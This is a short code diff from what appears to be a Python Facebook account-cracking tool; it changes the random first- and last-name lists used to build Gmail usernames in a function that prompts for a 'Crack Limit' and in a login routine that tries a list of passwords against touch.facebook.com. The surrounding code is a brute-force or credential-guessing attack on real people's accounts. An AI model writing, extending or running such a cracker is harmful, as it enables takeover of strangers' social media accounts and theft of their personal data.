@@ -935,7 +935,7 @@ def g_clone():
     os.system('clear')
     print(logo)
     print(f'{green}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
-    first = random.choice(['sumon','abinash','rakesh','riya','ramesh','somnath'])
+    first = random.choice(['sumon','rakesh',])
     domain = '@gmail.com'
     try:
         limit = int(input(' [:] Crack Limit : '))
@@ -2117,7 +2117,7 @@ def mail(uid,pwx,first,tl):
     try:
         for pw in pwx:
             Session = requests.Session()
-            last = random.choice(['roy','das','sarkar','mondal'])
+            last = random.choice(['roy','das','sarkar','mondal','biswas','ghosh','saha','haldar','khan','pal','ray',])
             idff = first+last+uid
             free_fb = Session.get('https://touch.facebook.com/').text
             data = {
